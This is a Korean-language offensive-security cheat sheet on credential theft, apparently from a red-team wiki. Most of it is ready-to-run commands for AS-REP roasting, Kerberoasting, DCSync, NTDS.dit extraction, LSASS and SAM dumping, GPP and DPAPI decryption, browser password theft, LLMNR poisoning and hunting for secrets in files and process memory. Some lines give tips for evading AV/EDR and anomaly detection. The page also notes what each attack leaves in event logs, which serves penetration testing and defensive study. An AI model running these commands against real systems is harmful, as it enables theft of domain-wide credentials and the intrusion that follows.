# 자격 증명 탈취

credential 확보를 위한 공격 기법. Kerberos 기반 공격, 메모리 덤프, credential 파일 탈취 등.

---

## AS-REP Roasting

Kerberos Pre-Authentication이 비활성화(DONT_REQUIRE_PREAUTH)된 계정을 대상으로 하는 공격.
이 설정이 되어 있는 계정은 패스워드 없이 AS-REP를 요청할 수 있고, 응답에 포함된 해시를 오프라인 크래킹할 수 있다.

```bash
# Impacket - 사용자 목록으로 AS-REP Roasting
impacket-GetNPUsers <domain>/ -usersfile users.txt -format hashcat \
  -outputfile asrep_hashes.txt -dc-ip <dc_ip> -no-pass

# nxc로 AS-REP Roastable 계정 확인
nxc ldap <dc_ip> -u <user> -p <pass> --asreproast output.txt
```

크래킹:
```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

!!! warning "탐지"
    Event 4768 (Kerberos AS Request) 에서 Pre-Auth Type 0x0으로 기록된다. 대량 요청 시 이상 탐지 가능.

SPN(Service Principal Name)이 설정된 서비스 계정의 TGS 티켓을 요청하여 오프라인 크래킹하는 공격.

서비스 계정(SPN 설정된 계정)은 도메인 사용자의 유효한 TGT만 있으면 누구나 TGS를 요청할 수 있다. TGS는 서비스 계정의 NTLM 해시로 암호화되어 있으므로, 약한 패스워드를 사용하면 크래킹이 가능하다.

```bash
# Impacket - Kerberoasting
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request

# 특정 사용자의 SPN만 요청
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> \
  -request-user <target_spn_user>
```

크래킹:
```bash
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt
```

!!! warning "탐지"
    Event 4769 (TGS Request) 에서 RC4 암호화(0x17) 요청이 기록된다. AES 요청으로 변경하면 이상 탐지를 줄일 수 있다.

`Replicating Directory Changes` 및 `Replicating Directory Changes All` 권한이 있는 계정으로 도메인 컨트롤러의 NTDS.dit 데이터를 복제하는 공격. 도메인 내 모든 사용자의 NTLM 해시를 획득할 수 있다.

```bash
# secretsdump - DCSync 공격
impacket-secretsdump '<domain>/<user>:<pass>@<dc_ip>'

# NTLM Hash로 실행
impacket-secretsdump '<domain>/<user>@<dc_ip>' -hashes :<ntlm_hash>

# 특정 사용자만
impacket-secretsdump '<domain>/<user>:<pass>@<dc_ip>' -just-dc-user Administrator
```

!!! warning "탐지"
    Event 4662 에서 `Replicating Directory Changes` 권한 사용이 기록된다. DC가 아닌 호스트에서 복제 요청 시 즉시 탐지된다.

## NTDS.dit 추출

도메인 컨트롤러에서 직접 NTDS.dit 파일을 추출하는 방법.

### Volume Shadow Copy (VSS)

```cmd
# diskshadow 스크립트 (Windows)
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

```powershell
# shadow copy에서 NTDS.dit 복사
copy E:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit

# SYSTEM 레지스트리 하이브 (복호화에 필요)
reg save HKLM\SYSTEM C:\Windows\Temp\system.bak
```

```bash
# 추출한 파일에서 해시 덤프 (공격자 호스트)
impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL
```

---

## Hash Cracking

### Hashcat

| 모드 | 해시 유형 | 용도 |
|------|-----------|------|
| 1000 | NTLM | Windows 패스워드 해시 |
| 13100 | Kerberoast (TGS-REP etype 23) | Kerberoasting |
| 18200 | AS-REP (etype 23) | AS-REP Roasting |
| 5600 | NetNTLMv2 | Responder 캡처 해시 |
| 3000 | LM | 레거시 |

```bash
# 기본 사전 공격
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt

# 규칙 기반 공격
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 특정 포맷: hashcat에 넣기 전에 해시 포맷을 확인할 것
# AS-REP: $krb5asrep$23$user@domain:...
# TGS-REP: $krb5tgs$23$*user$domain$...
```

### John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

---

## LLMNR/NBT-NS Poisoning

네트워크에서 LLMNR(Link-Local Multicast Name Resolution) 및 NBT-NS 쿼리를 가로채 NetNTLMv2 해시를 캡처하는 기법.

```bash
# Responder 실행
responder -I <interface> -dwP

# 캡처된 해시 크래킹
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

!!! warning "탐지"
    LLMNR/NBT-NS 응답을 모니터링하는 네트워크 보안 도구에서 탐지 가능. Windows Event 4624 Type 3에서 비정상 인증 소스 확인.

---

## LSASS 메모리 덤프

로컬 관리자 권한으로 LSASS 프로세스에서 NTLM 해시, Kerberos 티켓, 평문 비밀번호를 추출한다.

```powershell
# Mimikatz (가장 직접적이지만 탐지율 높음)
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# procdump (SysInternals - 정상 도구이므로 탐지 우회 가능)
procdump.exe -ma lsass.exe lsass.dmp
# 로컬에서 해시 추출
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"

# comsvcs.dll (LOLBin - 추가 도구 불필요)
# 먼저 LSASS PID 확인
tasklist /fi "imagename eq lsass.exe"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump PID C:\temp\lsass.dmp full

# Task Manager → lsass.exe 우클릭 → Create dump file (GUI)

# nanodump (AV/EDR 우회 특화)
nanodump.exe --write C:\temp\lsass.dmp

# pypykatz (Linux에서 dmp 파일 분석)
pypykatz lsa minidump lsass.dmp

# nxc로 원격 LSASS 덤프
nxc smb TARGET -u admin -p pass -M lsassy
nxc smb TARGET -u admin -p pass -M nanodump
nxc smb TARGET -u admin -p pass -M procdump
```

!!! warning "Credential Guard"
    Credential Guard가 활성화된 환경에서는 LSASS에서 NTLM 해시/평문 비밀번호를 추출할 수 없다. Kerberos 티켓만 일부 탈취 가능.

---

## SAM Database 덤프

로컬 계정의 NTLM 해시 추출. 로컬 관리자 권한 필요.

```bash
# nxc
nxc smb TARGET -u admin -p pass --sam

# Impacket (원격)
impacket-secretsdump admin:pass@TARGET --sam

# 레지스트리에서 추출 (Windows에서)
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
reg save HKLM\SECURITY C:\temp\security
# 로컬에서 파싱
impacket-secretsdump -sam sam -system system -security security LOCAL
```

---

## GPP (Group Policy Preferences) 비밀번호

SYSVOL에 저장된 Group Policy Preferences XML 파일에서 AES 암호화된 비밀번호 추출.

```bash
# nxc 모듈 (자동)
nxc smb DC_IP -u user -p pass -M gpp_password
nxc smb DC_IP -u user -p pass -M gpp_autologin

# 수동 탐색
smbclient //DC_IP/SYSVOL -U 'DOMAIN\user%pass'
# Groups.xml, Services.xml, Scheduledtasks.xml, Datasources.xml 등에서 cpassword 검색

# 복호화
gpp-decrypt ENCRYPTED_PASSWORD

# Metasploit
use auxiliary/scanner/smb/smb_enum_gpp
```

---

## DPAPI (Data Protection API)

Windows에서 Chrome 비밀번호, Credential Manager, RDP 자격 증명 등을 보호하는 암호화 체계.

```powershell
# Credential Manager 저장 자격 증명 확인
cmdkey /list
# 저장된 자격 증명으로 실행
runas /savecred /user:DOMAIN\admin cmd.exe

# DPAPI MasterKey 위치
dir C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\

# Mimikatz DPAPI 공격
# 1. MasterKey 복호화 (사용자 비밀번호 필요)
dpapi::masterkey /in:MASTERKEY_FILE /sid:USER_SID /password:PASSWORD

# 2. Credential 파일 복호화
dpapi::cred /in:C:\Users\USER\AppData\Local\Microsoft\Credentials\CRED_FILE /masterkey:KEY

# SharpDPAPI (비밀번호/NTLM 해시로 각종 DPAPI 보호 데이터 복호화)
.\SharpDPAPI.exe credentials /password:pass
.\SharpDPAPI.exe backupkey /file:key.pvk  # 도메인 DPAPI 백업키 (DC에서)
```

### 브라우저 비밀번호

```bash
# SharpChromium (Chrome/Edge)
.\SharpChromium.exe logins

# LaZagne (다수 앱의 자격 증명 일괄 추출)
.\LaZagne.exe all

# Linux
# Firefox
python3 firefox_decrypt.py ~/.mozilla/firefox/PROFILE/
```

---

## NetNTLMv1 다운그레이드

NetNTLMv1 해시는 NetNTLMv2보다 크래킹이 훨씬 쉽다. Responder 설정으로 다운그레이드 유도 가능.

```bash
# Responder.conf에서 Challenge 고정
# Challenge = 1122334455667788  (crack.sh 사용 시)

# NTLMv1 해시를 NTLM으로 변환
# crack.sh 또는 rainbow table 사용
# https://crack.sh (무료 NTLMv1 크래킹)
```

---

## Credential 탐색 (Post-Exploitation)

### Windows

```powershell
# 파일 내 패스워드 검색
findstr /si password *.txt *.xml *.ini *.config *.ps1

# PowerShell 히스토리
type $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Unattend/Sysprep 파일 (설치 시 비밀번호 포함)
type C:\Unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\system32\sysprep\unattend.xml

# IIS 설정
type C:\inetpub\wwwroot\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

# DPAPI 보호 credential
# Chrome, Edge 등의 브라우저 저장 패스워드
# Windows Credential Manager
cmdkey /list

# 레지스트리에 저장된 autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# WiFi 비밀번호
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# KeePass 데이터베이스 탐색
dir /s /b C:\*.kdbx
# KeeThief (메모리에서 마스터키 추출)
```

### Linux

```bash
# 히스토리 파일
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history

# 설정 파일
cat /etc/shadow
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name "*.kdbx" 2>/dev/null

# 환경변수
env | grep -i pass

# 런타임 프로세스에서 자격 증명
# /proc/PID/cmdline, /proc/PID/environ
for pid in $(ls /proc | grep -E '^[0-9]+$'); do
  cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ' | grep -i 'pass'
done

# .git 설정
find / -name ".git" -type d 2>/dev/null
# git log에서 비밀번호 변경 이력 확인
```

---

!!! info "관련 페이지"
    - 획득한 자격 증명 활용 → [횡적 이동](../lifecycle/lateral-movement.md)
    - Kerberoasting/DCSync 도구 → [도구 레퍼런스](../tools/index.md) (Impacket, Rubeus)
    - ADCS 인증서 기반 인증 → [ADCS 공격](../ad/adcs.md)
